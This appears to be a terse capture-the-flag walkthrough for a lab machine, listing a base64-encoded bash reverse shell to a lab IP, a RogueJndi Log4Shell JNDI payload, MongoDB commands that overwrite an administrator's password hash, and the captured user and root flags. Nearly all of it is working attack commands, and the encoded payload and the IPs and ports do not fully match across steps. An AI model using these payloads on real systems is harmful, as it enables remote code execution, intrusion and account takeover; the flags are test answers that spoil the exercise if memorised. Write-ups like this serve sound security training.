## Key Takeaways
1. echo 'bash -c bash -i >&/dev/tcp/10.10.14.66/4444 0>&1' | base64
2. YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjYvOTAwMSAwPiYxCg==
3. java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNDMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.43"
4. 6ced1a6a89e666c0620cdb10262ba127 user flag
5. ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
6. mkpasswd -m sha-512 Password1234
7. mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$HRc4ISf8xrbAhMlq$vnFX2yctDTwAOcowQRKCptagCwjZadpDe3Y8ahdLttuf2hS4q3gxP9I9cfqH8g37EQxTLsP5Vfj/Xsmbii3Ph."}})'
8. Went to dashboard and REALLY conveniently there is user and password for ssh bruh
9. e50bc93c75b634e4b272d2f771c33681 root flag
